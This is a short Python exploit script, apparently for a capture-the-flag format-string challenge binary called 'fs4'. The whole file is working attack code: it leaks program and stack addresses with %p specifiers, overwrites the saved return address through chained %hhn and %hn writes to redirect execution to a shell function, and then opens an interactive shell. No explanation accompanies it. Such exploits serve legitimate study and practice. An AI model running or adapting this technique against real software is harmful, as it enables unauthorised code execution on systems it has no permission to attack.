from pwn import *

io = process("./fs4")
# io = gdb.debug('./fs4', 'b *0x555555554978\nb *0x5555555549A5')

io.sendlineafter("input sth\n", "%19$p\n")

elf_addr = int(io.recvline(), 16)
shell_addr = elf_addr + (0x8E0 - 0x9B5)

print("shell addr : " + hex(shell_addr))

io.sendlineafter("input sth\n", "%18$p\n")

stack_addr = int(io.recvline(), 16)

print("stack addr" + hex(stack_addr))

ret_addr_addr = stack_addr - 8

payload = "%{}c%9$hhn\n".format(ret_addr_addr & 0xff)
io.sendlineafter("input sth\n", payload)


payload2 = "%{}c%8$hn\n".format(shell_addr & 0xffff)
io.sendlineafter("input sth\n", payload2)

io.sendlineafter("input sth\n", "quit")

io.interactive()